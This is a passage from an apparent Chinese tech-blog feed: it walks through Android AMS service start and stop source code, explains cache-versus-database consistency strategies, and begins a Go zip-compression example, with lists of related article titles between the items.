RemoteException {// 如果进程记录的应用线程为空，抛出远程异常if (app.thread == null) {throw new RemoteException();}// 设置服务的应用记录r.app = app;// 更新服务的最后活动时间和重启时间r.restartTime = r.lastActivity = SystemClock.uptimeMillis();// 将服务添加到应用的服务体系表中app.services.add(r);// 增加服务执行的计数，并根据是否在前台执行来更新状态bumpServiceExecutingLocked(r, execInFg, "create");// 更新进程的最近最少使用（LRU）状态mAm.updateLruProcessLocked(app, false, null);// 更新内存调整mAm.updateOomAdjLocked();boolean created = false;try {// 同步电池统计数据的更新synchronized (r.stats.getBatteryStats()) {r.stats.startLaunchedLocked();}// 确保包的dex文件已经优化mAm.ensurePackageDexOpt(r.serviceInfo.packageName);// 强制进程状态至少为服务状态app.forceProcessStateUpTo(ActivityManager.PROCESS_STATE_SERVICE);// 关键方法1：通过应用线程调度服务的创建app.thread.scheduleCreateService(r, r.serviceInfo,mAm.compatibilityInfoForPackageLocked(r.serviceInfo.applicationInfo),app.repProcState);r.postNotification();// 标记服务已创建created = true;} catch (DeadObjectException e) {//...} finally {// 如果服务未创建成功，进行清理操作if (!created) {app.services.remove(r);r.app = null;// 安排服务重启scheduleServiceRestartLocked(r, false);return;}}// 请求服务的绑定requestServiceBindingsLocked(r, execInFg);// 更新服务客户端活动updateServiceClientActivitiesLocked(app, null, true);// 如果服务请求启动并且需要调用 onStartCommand，添加一个启动项if (r.startRequested &amp;&amp; r.callStart &amp;&amp; r.pendingStarts.size() == 0) {r.pendingStarts.add(new ServiceRecord.StartItem(r, false, r.makeNextStartId(),null, null));}// 关键方法2：发送服务参数,回调执行 onStartCommandsendServiceArgsLocked(r, execInFg, true);// 如果服务是延迟启动的，从延迟启动列表中移除if (r.delayed) {getServiceMap(r.userId).mDelayedStartList.remove(r);r.delayed = false;}// 如果服务已经请求延迟停止，取消延迟停止请求if (r.delayedStop) {r.delayedStop = false;if (r.startRequested) {stopServiceLocked(r);}}}//...这一条调用关系线下来，从调用关系上依次为：startServiceLockedstartServiceInnerLockedbringUpServiceLockedrealStartServiceLocked最后的realStartServiceLocked才是实际启动服务的方法，主要作用是确保服务在正确的进程中被创建和启动。它涉及到与应用程序线程的通信，服务状态的更新，以及服务生命周期的管理。代码中的scheduleCreateService方法用于请求应用程序线程创建服务，requestServiceBindingsLocked方法用于请求服务的绑定（下一节会涉及），sendServiceArgsLocked方法用于发送服务的参数。ServiceRecord对象表示一个服务的记录，它包含了服务的状态和配置信息。ProcessRecord对象表示一个进程的记录，它包含了进程的状态和配置信息。到这里我们主要关注2个关键方法：scheduleCreateService（调用service的onCreate）sendServiceArgsLocked（调用到service的onStartCommand）1.1 scheduleCreateService相关流程解读(startService到onCreate)这里实际上是以startService到service组件调用onCreate的流程分析为目的。代码实现如下：//ActivityThread//ApplicationThreadpublic final void scheduleCreateService(IBinder token,ServiceInfo info, CompatibilityInfo compatInfo, int processState) {updateProcessState(processState, false);CreateServiceData s = new CreateServiceData();s.token = token;s.info = info;s.compatInfo = compatInfo;sendMessage(H.CREATE_SERVICE, s);}//消息处理private class H extends Handler {//...public void handleMessage(Message msg) {switch (msg.what) {case CREATE_SERVICE:Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, "serviceCreate");handleCreateService((CreateServiceData)msg.obj);Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);break;//...}}//...}//...private void handleCreateService(CreateServiceData data) {// 取消调度GC Idler，以确保在服务创建期间不会进行垃圾回收，影响服务启动性能unscheduleGcIdler();// 获取服务所在应用的LoadedApk对象，它包含了应用的加载信息LoadedApk packageInfo = getPackageInfoNoCheck(data.info.applicationInfo, data.compatInfo);Service service = null;try {// 获取ClassLoader对象，用于加载服务类java.lang.ClassLoader cl = packageInfo.getClassLoader();// 加载服务类并创建实例service = (Service) cl.loadClass(data.info.name).newInstance();} catch (Exception e) {//...}try {ContextImpl context = ContextImpl.createAppContext(this, packageInfo);context.setOuterContext(service);// 创建应用程序实例Application app = packageInfo.makeApplication(false, mInstrumentation);// 服务attach到上下文环境service.attach(context, this, data.info.name, data.token, app,ActivityManagerNative.getDefault());// 调用服务的onCreate()生命周期方法service.onCreate();// 将服务实例存储在映射中，以便后续访问mServices.put(data.token, service);// 通知AMS服务已执行完成try {ActivityManagerNative.getDefault().serviceDoneExecuting(data.token, SERVICE_DONE_EXECUTING_ANON, 0, 0);} catch (RemoteException e) {//...}} catch (Exception e) {//...}}这段代码的主要作用是创建服务实例并初始化服务的上下文环境。它涉及到类加载、服务实例化、上下文环境的设置以及服务生命周期的管理（主要是onCreate）。代码中的CreateServiceData对象包含了创建服务所需的所有信息，如服务信息、兼容性信息等。ContextImpl对象表示服务的上下文环境，它提供了服务所需的各种资源和信息。Service对象是服务的实际实例，它实现了服务的具体功能。1.2 sendServiceArgsLocked相关流程分析(startService到onStartCommand)这里实际上是以startService到service组件调用onStartCommand的流程分析为目的。代码实现如下：//ActivityServiceprivate final void sendServiceArgsLocked(ServiceRecord r, boolean execInFg,boolean oomAdjusted) {final int N = r.pendingStarts.size();if (N == 0) {return;}while (r.pendingStarts.size() &gt; 0) {try {// 从待处理列表中取出第一个启动项ServiceRecord.StartItem si = r.pendingStarts.remove(0);// 如果启动项的Intent为空，并且不是唯一的启动项，则跳过处理if (si.intent == null &amp;&amp; N &gt; 1) {continue;}// 记录启动项的交付时间si.deliveredTime = SystemClock.uptimeMillis();// 将启动项添加到已交付列表中r.deliveredStarts.add(si);// 增加启动项的交付次数si.deliveryCount++;// 如果启动项需要授予URI权限，进行授权if (si.neededGrants != null) {mAm.grantUriPermissionUncheckedFromIntentLocked(si.neededGrants,si.getUriPermissionsLocked());}// 增加服务执行的计数，并根据是否在前台执行来更新状态bumpServiceExecutingLocked(r, execInFg, "start");// 如果服务的OOM优先级尚未调整，则进行调整if (!oomAdjusted) {oomAdjusted = true;mAm.updateOomAdjLocked(r.app);}// 设置启动服务的标志int flags = 0;if (si.deliveryCount &gt; 1) {flags |= Service.START_FLAG_RETRY;}if (si.doneExecutingCount &gt; 0) {flags |= Service.START_FLAG_REDELIVERY;}// 关键方法：传递应用线程调度服务的启动参数，发送消息启动服务r.app.thread.scheduleServiceArgs(r, si.taskRemoved, si.id, flags, si.intent);} catch (Exception e) {//...break;}}}这段代码的主要作用是处理服务的启动参数，并将这些参数发送给服务。它涉及到服务启动项的处理、URI权限的授权、服务执行计数的增加以及服务启动参数的调度。代码中的ServiceRecord对象表示一个服务的记录，它包含了服务的状态和配置信息。ServiceRecord.StartItem对象表示一个服务启动项，它包含了启动服务所需的参数。最后调用scheduleServiceArgs发送消息，代码实现如下：//ActivityThread//ApplicationThreadpublic final void scheduleServiceArgs(IBinder token, boolean taskRemoved, int startId,int flags ,Intent args) {ServiceArgsData s = new ServiceArgsData();s.token = token;s.taskRemoved = taskRemoved;s.startId = startId;s.flags = flags;s.args = args;sendMessage(H.SERVICE_ARGS, s);}//消息处理private class H extends Handler {//...public void handleMessage(Message msg) {switch (msg.what) {case SERVICE_ARGS:Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, "serviceStart");handleServiceArgs((ServiceArgsData)msg.obj);Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);break;//...}}//...}//...private void handleServiceArgs(ServiceArgsData data) {// 根据服务的token获取服务实例Service s = mServices.get(data.token);if (s != null) {try {// 如果有启动参数Intent，设置它的ClassLoader为服务的ClassLoader，并准备进入进程if (data.args != null) {data.args.setExtrasClassLoader(s.getClassLoader());data.args.prepareToEnterProcess();}// 定义服务启动命令的返回结果变量int res;// 如果服务是因为任务栈被移除而启动的，调用onTaskRemoved方法if (!data.taskRemoved) {//关键方法：调用服务的onStartCommand方法，并传递启动参数res = s.onStartCommand(data.args, data.flags, data.startId);} else {// 如果服务是因为任务栈被移除而启动的，调用onTaskRemoved方法s.onTaskRemoved(data.args);// 设置返回结果为任务移除完成res = Service.START_TASK_REMOVED_COMPLETE;}// 等待队列中的工作完成QueuedWork.waitToFinish();// 关键方法：通知AMS已经完成try {ActivityManagerNative.getDefault().serviceDoneExecuting(data.token, SERVICE_DONE_EXECUTING_START, data.startId, res);} catch (RemoteException e) {//...}// 确保JIT（即时编译）被启用ensureJitEnabled();} catch (Exception e) {//...}}}这段代码的主要作用是接收服务的启动参数，调用服务的onStartCommand方法，并处理服务执行完成后的清理工作。它涉及到服务实例的获取、启动参数的处理、服务方法的调用以及服务执行状态的反馈。代码中的ServiceArgsData对象包含了服务启动所需的所有参数，如启动Intent、启动标志、启动ID等。2 AMS.stopService流程解读(onDestroy)AMS.stopService代码实现如下：//ActivityManagerService@Overridepublic int stopService(IApplicationThread caller, Intent service,String resolvedType, int userId) {enforceNotIsolatedCaller("stopService");//...synchronized(this) {return mServices.stopServiceLocked(caller, service, resolvedType, userId);}}这里调用了ActivityService的stopServiceLocked方法，代码实现如下：//ActivityService//关键流程：step1int stopServiceLocked(IApplicationThread caller, Intent service,String resolvedType, int userId) {// 获取调用者的进程记录final ProcessRecord callerApp = mAm.getRecordForAppLocked(caller);//...// 查找要停止的服务记录ServiceLookupResult r = retrieveServiceLocked(service, resolvedType,Binder.getCallingPid(), Binder.getCallingUid(), userId, false, false);// 如果找到了服务记录，并且记录不为空if (r != null &amp;&amp; r.record != null) {final long origId = Binder.clearCallingIdentity();try {// 关键方法：调用停止服务的内部方法stopServiceLocked(r.record);} finally {Binder.restoreCallingIdentity(origId);}// 返回1表示服务成功停止return 1;}// 如果服务记录为空，返回-1表示服务未找到return -1;}//关键流程：step2private void stopServiceLocked(ServiceRecord service) {// 如果服务是延迟停止的，设置延迟停止标志并返回if (service.delayed) {service.delayedStop = true;return;}// 同步电池统计数据的更新synchronized (service.stats.getBatteryStats()) {// 停止服务的电池统计数据service.stats.stopRunningLocked();}// 标记服务不再被请求启动service.startRequested = false;// 如果服务有状态跟踪器，设置服务为未启动状态if (service.tracker != null) {service.tracker.setStarted(false, mAm.mProcessStats.getMemFactorLocked(),SystemClock.uptimeMillis());}// 标记服务的onStartCommand方法不再被调用service.callStart = false;// 如果需要，执行服务的停止逻辑bringDownServiceIfNeededLocked(service, false, false);}//关键流程：step3private final void bringDownServiceIfNeededLocked(ServiceRecord r, boolean knowConn, boolean hasConn) {// 检查服务是否仍然需要如果服务仍然需要，例如服务正在运行或者有待处理的启动请求，则不停止服务并直接返回if (isServiceNeeded(r, knowConn, hasConn)) {return;}// 如果服务在待处理列表中，说明服务的启动请求还在处理中，因此不停止服务if (mPendingServices.contains(r)) {return;}// 如果服务不再需要且不在待处理列表中，则停止服务bringDownServiceLocked(r);}//关键流程：step4private final void bringDownServiceLocked(ServiceRecord r) {// 通知所有绑定到该服务的客户端，服务已经死亡for (int conni = r.connections.size() - 1; conni &gt;= 0; conni--) {ArrayList&lt;ConnectionRecord&gt; c = r.connections.valueAt(conni);for (int i = 0; i &lt; c.size(); i++) {ConnectionRecord cr = c.get(i);// 标记服务为死亡状态cr.serviceDead = true;try {// 通知客户端服务已经死亡cr.conn.connected(r.name, null);} catch (Exception e) {//...}}}// 如果服务已经被应用bind，通知应用服务已经被unbind// 本次分析不涉及bind和unbind操作，因此忽略即可if (r.app != null &amp;&amp; r.app.thread != null) {for (int i = r.bindings.size() - 1; i &gt;= 0; i--) {IntentBindRecord ibr = r.bindings.valueAt(i);if (ibr.hasBound) {try {// 增加服务执行的计数，并根据是否在前台执行来更新状态bumpServiceExecutingLocked(r, false, "bring down unbind");// 更新内存调整mAm.updateOomAdjLocked(r.app);// 标记服务为未绑定状态ibr.hasBound = false;// 通知应用服务已经被解绑r.app.thread.scheduleUnbindService(r, ibr.intent.getIntent());} catch (Exception e) {// 异常处理代码...serviceProcessGoneLocked(r);}}}}// 记录服务销毁的时间r.destroyTime = SystemClock.uptimeMillis();// 获取服务映射对象final ServiceMap smap = getServiceMap(r.userId);// 从服务映射中移除服务smap.mServicesByName.remove(r.name);smap.mServicesByIntent.remove(r.intent);// 重置服务的总重启次数r.totalRestartCount = 0;// 取消服务的重启计划unscheduleServiceRestartLocked(r, 0, true);// 从待处理服务列表中移除服务for (int i = mPendingServices.size() - 1; i &gt;= 0; i--) {if (mPendingServices.get(i) == r) {mPendingServices.remove(i);}}// 取消服务的通知r.cancelNotification();// 标记服务不在前台r.isForeground = false;// 重置前台服务的IDr.foregroundId = 0;// 重置前台通知r.foregroundNoti = null;// 清除已交付的启动请求r.clearDeliveredStartsLocked();// 清除待处理的启动请求r.pendingStarts.clear();// 如果服务所属的应用还存在if (r.app != null) {// 同步电池统计数据的更新synchronized (r.stats.getBatteryStats()) {r.stats.stopLaunchedLocked();}// 从应用的服务列表中移除服务r.app.services.remove(r);// 如果应用线程还存在，更新服务的前台状态if (r.app.thread != null) {updateServiceForegroundLocked(r.app, false);try {// 增加服务执行的计数，并根据是否在前台执行来更新状态bumpServiceExecutingLocked(r, false, "destroy");// 添加服务到正在销毁的服务列表中mDestroyingServices.add(r);// 标记服务为正在销毁状态r.destroying = true;// 更新内存调整mAm.updateOomAdjLocked(r.app);// 关键方法：通知应用销毁服务r.app.thread.scheduleStopService(r);} catch (Exception e) {// 异常处理代码...}}}// 清除服务的绑定if (r.bindings.size() &gt; 0) {r.bindings.clear();}// 如果服务有重启器，设置服务为nullif (r.restarter instanceof ServiceRestarter) {((ServiceRestarter) r.restarter).setService(null);}int memFactor = mAm.mProcessStats.getMemFactorLocked();long now = SystemClock.uptimeMillis();// 如果服务有状态跟踪器，设置服务为未启动和未绑定状态if (r.tracker != null) {r.tracker.setStarted(false, memFactor, now);r.tracker.setBound(false, memFactor, now);// 如果服务的执行嵌套计数为0，清除当前所有者if (r.executeNesting == 0) {r.tracker.clearCurrentOwner(r, false);r.tracker = null;}}// 确保服务不在启动的后台服务列表中smap.ensureNotStartingBackground(r);}这一条调用关系线下来，从调用关系上依次为：stopServiceLockedstopServiceLockedbringDownServiceIfNeededLockedbringDownServiceLocked最后的bringDownServiceLocked才是实际关闭服务的方法，它的作用是关闭服务并执行相关的清理工作。它涉及到服务绑定的清理（如果bind则执行unbind操作，主要针对bindservice操作，本次分析不涉及）、服务执行计数的更新、服务状态的更新、服务通知的取消以及服务销毁逻辑的调用。接下来我们主要关注对应startService的通知应用销毁服务的关键方法：scheduleStopService,代码实现如下：//ActivityThread//ApplicationThreadpublic final void scheduleStopService(IBinder token) {sendMessage(H.STOP_SERVICE, token);}//消息处理private class H extends Handler {//...public void handleMessage(Message msg) {switch (msg.what) {case STOP_SERVICE:Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, "serviceStop");handleStopService((IBinder)msg.obj);maybeSnapshot();Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);break;//...}}//...}//...private void handleStopService(IBinder token) {Service s = mServices.remove(token);if (s != null) {try {// 关键方法：调用服务的onDestroy生命周期方法s.onDestroy();// 获取服务的上下文环境Context context = s.getBaseContext();// 如果上下文环境是ContextImpl的实例，安排最终的清理工作if (context instanceof ContextImpl) {final String who = s.getClassName();// 安排清理服务关联的资源和数据((ContextImpl) context).scheduleFinalCleanup(who, "Service");}// 等待队列中的工作完成，确保所有异步任务完成QueuedWork.waitToFinish();// 通知ActivityManager服务已经执行完成停止操作try {ActivityManagerNative.getDefault().serviceDoneExecuting(token, SERVICE_DONE_EXECUTING_STOP, 0, 0);} catch (RemoteException e) {//...}} catch (Exception e) {//...}}}这段代码的主要作用是处理服务的停止请求，包括调用服务的onDestroy方法、清理服务关联的资源和数据，以及通知AMS服务已经停止。代码中的mServices是一个保存服务实例的映射，它使用服务的token作为键。代码中的ContextImpl是Android中上下文环境的实现类，它提供了额外的功能，如安排最终的清理工作。至此，我们就分析清楚了2个关键流程：AMS.startService-&gt;service组件onCreate、onStartCommandAMS.stopService-&gt;service组件onDestroy下一章节，我们专注分析bindService启动及停止相关流程，以及如何执行到组件的回调，尤其是bind和unbind。http://www.ppmy.cn/news/1540876.html相关文章深入解析缓存与数据库数据不一致问题缓存层是提高系统响应速度和扩展性的关键组件。然而&amp;#xff0c;缓存层的引入也带来了数据一致性的挑战。 
当数据库中的数据发生变化时&amp;#xff0c;如何确保这些变化能够及时且准确地反映到缓存中&amp;#xff0c;是确保用户体验和系统可靠性的重要问题。 
1. 数据一致性 
首先&amp;am…阅读更多...go压缩的使用基础&amp;#xff1a;使用go创建一个zip 
func base(path string) {// 创建 zip 文件zipFile, err : os.Create("test.zip")if err ! nil {panic(err)}defer zipFile.Close()// 创建一个新的 *Writer 对象zipWriter : zip.NewWriter(zipFile)defer zipWriter.Close()// 创…阅读更多...原理代码解读：基于DiT结构视频生成模型的ControlNetDiffusion Models视频生成-博客汇总 前言：相比于基于UNet结构的视频生成模型，DiT结构的模型最大的劣势在于生态不够完善，配套的ControlNet、IP-Adapter等开源权重不多，导致难以落地。最近DiT-based 5B的ControlNet开源了，相比于传统的ControlNet有不少改进点，这篇博客将从…阅读更多...RabbitMQ 作为消息中间件，实现了支付消息的异步发送和接收， 同步和异步相比 响应速度具体比较在支付场景中&amp;#xff0c;使用 RabbitMQ 实现消息的异步发送和接收与同步处理相比&amp;#xff0c;响应速度和整体系统性能会有显著的不同。以下是同步和异步方式在响应速度上的详细比较&amp;#xff1a;  
1. 同步处理方式 
在同步模式下&amp;#xff0c;支付消息的处理流程通常是&amp;#xf…阅读更多...如何将 ECharts 图表插入 HTML Canvas在 Web 开发中&amp;#xff0c;数据可视化是一个常见且重要的需求。ECharts 是一个强大的图表库&amp;#xff0c;而 HTML5 Canvas 则提供了灵活的绘图能力。今天&amp;#xff0c;我们将探讨如何将这两者结合起来&amp;#xff0c;实现将 ECharts 生成的图表插入到 HTML Canvas 中的特定位置。 
为…阅读更多...docker 文件目录迁移文章参考 
du -hs /var/lib/docker/ 命令查看磁盘使用情况。 
du -hs /var/lib/docker/docker system df命令&amp;#xff0c;类似于Linux上的df命令&amp;#xff0c;用于查看Docker的磁盘使用情况: 
rootnn0:~$ docker system df
TYPE TOTAL ACTIVE SIZE RECLAIMABLE
Images 7 2 122.2…阅读更多...【微信小程序_11_全局配置】摘要：本文介绍了微信小程序全局配置文件 app.json 中的常用配置项，重点阐述了 window 节点的各项配置，包括导航栏标题文字、背景色、标题颜色，窗口背景色、下拉刷新样式以及上拉触底距离等。通过这些配置可实现小程序窗口外观的个性化设置，提升用户体验。 微信小程序_11_全…阅读更多...智能听诊器：宠物健康管理的得力助手随着科技的进步&amp;#xff0c;智能听诊器已经成为宠物健康管理领域的一项革命性发明。它不仅能够实时监测宠物的心跳、呼吸频率和节律等关键生理指标&amp;#xff0c;而且通过高精度的传感器捕捉到宠物心跳的微小变化和呼吸频率的微妙差异&amp;#xff0c;为宠物主人提供了实时的健康数据…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:51 +0000</pubDate>
    </item>
    <item>
      <title>深入解析缓存与数据库数据不一致问题</title>
      <link>https://www.ppmy.cn/news/1540875.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维深入解析缓存与数据库数据不一致问题news/2025/10/31 23:18:50/缓存层是提高系统响应速度和扩展性的关键组件。然而，缓存层的引入也带来了数据一致性的挑战。当数据库中的数据发生变化时，如何确保这些变化能够及时且准确地反映到缓存中，是确保用户体验和系统可靠性的重要问题。1. 数据一致性首先，我们需要清楚什么情况符合【数据一致性】缓存中有数据，缓存中的值需要和数据库中的值保持一致；缓存中没有数据，数据库中的值必须是最新值。不属于这两种情况的，则就是缓存和数据库数据不一致问题了。根据是否接收写请求，我们可以把缓存分成读写缓存和只读缓存。1.1 读写缓存对于读写缓存来说，如果要对数据进行增删改，就需要在缓存中进行，同时还要根据采取的写回策略，决定是否同步写回到数据库中。同步直写策略：写缓存时，也同步写数据库，缓存和数据库中的数据一致；异步写回策略：写缓存时不同步写数据库，等到数据从缓存中淘汰时，再写回数据库。使用这种策略时，如果数据还没有写回数据库，缓存就发生了故障，那么，此时，数据库就没有最新的数据了。所以，对于读写缓存来说，要想保证缓存和数据库中的数据一致，就要采用同步直写策略。不过，需要注意的是，如果采用这种策略，就需要同时更新缓存和数据库。所以，我们要在业务应用中使用事务机制，来保证缓存和数据库的更新具有原子性，也就是说，两者要不一起更新，要不都不更新，返回错误信息，进行重试。否则，我们就无法实现同步直写。当然，在有些场景下，我们对数据一致性的要求可能不是那么高，比如说缓存的是电商商品的非关键属性或者短视频的创建或修改时间等，那么，我们可以使用异步写回策略。1.2 只读缓存对于只读缓存来说，当有数据新增时，会直接写入数据库；当有数据删改时，需要把缓存中的数据标记为无效，当应用后续再访问这些增删改的数据时，因为发生缓存缺失，就会读取数据库，把数据放入缓存中了。那么在上面的步骤中，“数据不一致”的情况会不会发生呢？1.2.1 新增操作如果是新增数据，则直接保存到数据库中，缓存中是没有值的。符合一致性的第2种情况，此时缓存和数据库中数据是一致的。1.2.2 删改数据如果发生删改操作，既要更新数据库，也要删除缓存，这两个操作如果无法保证原子性，就会发生数据不一致的情况。那么到底是先更新数据库，再删除缓存？还是先删除缓存，再更新数据库呢？我们分别来讨论下。先删除缓存，再更新数据库假如删除缓存成功，更新数据库失败，那么当应用再次访问数据时，发生缓存缺失，就去访问数据库，而数据库中的值为旧值。先更新数据库，再删除缓存如果更新数据库成功，删除缓存失败了，那数据库中的值是最新值，缓存中的值是旧值，这肯定是不一致的。重试机制从上面的流程可以看出，无论是哪种情况，都会发生数据不一致的情况，那如何解决呢？就是重试机制。比如说，当应用删除缓存失败或更新数据库失败时，可以把要删除的缓存值或要更新的数据库值保存到消息队列中，然后从消息队列中重新读取这些值，再次的进行删除或更新。并发情况在上面的讨论中，说的是在更新数据库和删除缓存中，有一个失败的情况下，导致的“数据不一致”。实际上，即使这两个操作都成功，当有大量并发请求时，应用还是有可能读到不一致的数据。先删除缓存，再更新数据库比如，线程 A 删除缓存成功，再还没来得及更新数据库时，线程 B 开始读取数据，它发现缓存缺失，然后去数据库读取数据，此时有两个问题：线程 B 读取到了旧值；线程 B 会把读取到的旧值，写入到缓存中，这会导致其他线程从缓存中读到旧值（会一直脏下去，直到缓存过期）等到线程 B 执行完成后，线程 A 才开始更新数据库，此时数据库数据是最新值，缓存中是旧值。针对这种情况，我们可以在线程 A 更新数据库后，sleep 一小段时间，再执行一次删除缓存操作。线程 A sleep 的时间，就需要大于线程 B 读取数据再写入缓存的时间。这个时间怎么确定呢？可以在业务程序运行的时候，统计下线程读数据和写缓存的操作时间，以此为基础来进行估算。当其它线程读取数据时，会发现缓存缺失，所以会从数据库中读取最新值。先更新数据库，再删除缓存当线程 A 更新数据库后，还没来得及删除缓存，此时线程 B开始读取数据，发生缓存命中，读取到旧数据。但是，线程 A很快就执行删除缓存，让缓存失效了，后续的查询请求会发生缓存缺失，然后去查询数据库最新值了。所以，这种情况对业务的影响较小。但是，有一种极端情况但是这种情况，理论上会出现，实际上概率特别低。它需要满足，在读缓存时缓存失效，而且并发着有一个写操作。而实际上数据库的写操作会比读操作慢得多，而且还要锁表，而读操作必需在写操作前进入数据库操作，而又要晚于写操作更新缓存，所有的这些条件都具备的概率基本并不大。总结下面我们来总结下，发生数据不一致的情况有哪些删除缓存或更新数据库某一步失败而导致的数据不一致，可以使用重试机制确保删除或更新操作成功。在删除缓存值、更新数据库的这两步操作中，有其他线程的并发读操作，导致其他线程读取到旧值，应对方案是延迟双删。http://www.ppmy.cn/news/1540875.html相关文章go压缩的使用基础&amp;#xff1a;使用go创建一个zip 
func base(path string) {// 创建 zip 文件zipFile, err : os.Create("test.zip")if err ! nil {panic(err)}defer zipFile.Close()// 创建一个新的 *Writer 对象zipWriter : zip.NewWriter(zipFile)defer zipWriter.Close()// 创…阅读更多...原理代码解读：基于DiT结构视频生成模型的ControlNetDiffusion Models视频生成-博客汇总 前言：相比于基于UNet结构的视频生成模型，DiT结构的模型最大的劣势在于生态不够完善，配套的ControlNet、IP-Adapter等开源权重不多，导致难以落地。最近DiT-based 5B的ControlNet开源了，相比于传统的ControlNet有不少改进点，这篇博客将从…阅读更多...RabbitMQ 作为消息中间件，实现了支付消息的异步发送和接收， 同步和异步相比 响应速度具体比较在支付场景中&amp;#xff0c;使用 RabbitMQ 实现消息的异步发送和接收与同步处理相比&amp;#xff0c;响应速度和整体系统性能会有显著的不同。以下是同步和异步方式在响应速度上的详细比较&amp;#xff1a;  
1. 同步处理方式 
在同步模式下&amp;#xff0c;支付消息的处理流程通常是&amp;#xf…阅读更多...如何将 ECharts 图表插入 HTML Canvas在 Web 开发中&amp;#xff0c;数据可视化是一个常见且重要的需求。ECharts 是一个强大的图表库&amp;#xff0c;而 HTML5 Canvas 则提供了灵活的绘图能力。今天&amp;#xff0c;我们将探讨如何将这两者结合起来&amp;#xff0c;实现将 ECharts 生成的图表插入到 HTML Canvas 中的特定位置。 
为…阅读更多...docker 文件目录迁移文章参考 
du -hs /var/lib/docker/ 命令查看磁盘使用情况。 
du -hs /var/lib/docker/docker system df命令&amp;#xff0c;类似于Linux上的df命令&amp;#xff0c;用于查看Docker的磁盘使用情况: 
rootnn0:~$ docker system df
TYPE TOTAL ACTIVE SIZE RECLAIMABLE
Images 7 2 122.2…阅读更多...【微信小程序_11_全局配置】摘要：本文介绍了微信小程序全局配置文件 app.json 中的常用配置项，重点阐述了 window 节点的各项配置，包括导航栏标题文字、背景色、标题颜色，窗口背景色、下拉刷新样式以及上拉触底距离等。通过这些配置可实现小程序窗口外观的个性化设置，提升用户体验。 微信小程序_11_全…阅读更多...智能听诊器：宠物健康管理的得力助手随着科技的进步&amp;#xff0c;智能听诊器已经成为宠物健康管理领域的一项革命性发明。它不仅能够实时监测宠物的心跳、呼吸频率和节律等关键生理指标&amp;#xff0c;而且通过高精度的传感器捕捉到宠物心跳的微小变化和呼吸频率的微妙差异&amp;#xff0c;为宠物主人提供了实时的健康数据…阅读更多...oracle numtodsintervalOracle的numtodsinterval函数用于将数字转换为间隔值&amp;#xff08;INTERVAL&amp;#xff09;。这个函数接受一个数字和一个间隔种类作为参数&amp;#xff0c;并返回一个间隔值。 
种类参数可以是&amp;#xff1a; DAY  HOUR  MINUTE  SECOND  
下面是一些使用numtodsinterval函数的例子&amp;…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:50 +0000</pubDate>
    </item>
    <item>
      <title>go压缩的使用</title>
      <link>https://www.ppmy.cn/news/1540874.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维go压缩的使用news/2025/10/31 23:18:49/基础：使用go创建一个zipfunc base(path string) {// 创建 zip 文件zipFile, err := os.Create("test.zip")if err != nil {panic(err)}defer zipFile.Close()// 创建一个新的 *Writer 对象zipWriter := zip.NewWriter(zipFile)defer zipWriter.Close()// 创建一个压缩包中的文件fileWriter, err := zipWriter.Create("这个地方填文件的新名字.jpg")if err != nil {panic(err)}// 打开要压缩的文件f, err := os.Open(path)if err != nil {panic(err)}defer f.Close()// 将文件内容拷贝到 ZIP 文件中if _, err := io.Copy(fileWriter, f); err != nil {panic(err)}// zipWriter.Close() 在 defer 中已经处理println("ZIP 文件创建成功!")
